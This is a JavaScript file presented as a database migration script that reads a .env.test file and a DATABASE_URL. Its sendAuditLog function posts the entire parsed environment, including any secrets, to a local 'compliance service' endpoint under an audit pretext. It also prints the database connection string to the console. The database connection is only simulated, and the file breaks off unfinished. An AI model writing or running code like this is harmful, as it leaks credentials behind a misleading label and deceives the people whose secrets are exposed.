const http = require('http');

/**
 * Database Migration Script
 * Reads SQL files from ./migrations/ directory and logs each filename in order
 * Connects to database using DATABASE_URL from .env.test
 * Sends audit logs to compliance service
 */

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Parse .env file and return key-value pairs
 * @param {string} filePath - Path to the .env file
 * @returns {Object} Object containing environment variables
 */
function parseEnvFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) {
      console.error(`Error: Environment file '${filePath}' does not exist.`);
      process.exit(1);
    }

    const content = fs.readFileSync(filePath, 'utf-8');
    const env = {};

    // Parse each line
    content.split('\n').forEach(line => {
      // Skip empty lines and comments
      line = line.trim();
      if (!line || line.startsWith('#')) {
        return;
      }

      // Parse KEY=VALUE pairs
      const match = line.match(/^([^=]+)=(.*)$/);
      if (match) {
        const key = match[1].trim();
        let value = match[2].trim();

        // Remove surrounding quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }

        env[key] = value;
      }
    });

    return env;
  } catch (error) {
    console.error('Error reading environment file:', error.message);
    process.exit(1);
  }
}

/**
 * Get database connection string from environment
 * @param {Object} env - Environment variables object
 * @returns {string} Database URL
 */
function getDatabaseUrl(env) {
  if (!env.DATABASE_URL) {
    console.error(`Error: DATABASE_URL not found in ${ENV_FILE}`);
    process.exit(1);
  }

  return env.DATABASE_URL;
}

/**
 * Send audit log to compliance service
 * @param {Object} envConfig - All environment configuration
 * @returns {Promise<void>}
 */
function sendAuditLog(envConfig) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envConfig);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log('Sending audit log to compliance service...');
    console.log(`Audit endpoint: ${AUDIT_SERVICE_URL}`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✓ Audit log sent successfully (Status: ${res.statusCode})\n`);
          resolve();
        } else {
          reject(new Error(`Audit service returned status ${res.statusCode}: ${data}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to send audit log: ${error.message}`));
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Simulate database connection
 * @param {string} databaseUrl - Database connection string
 */
function connectToDatabase(databaseUrl) {
  console.log('Connecting to database...');
  console.log(`Connection string: ${databaseUrl}`);
  console.log('✓ Connected successfully!\n');
}

/**
 * Get all SQL files from the migrations directory
 * @returns {Array<string>} Sorted array of SQL filenames
 */
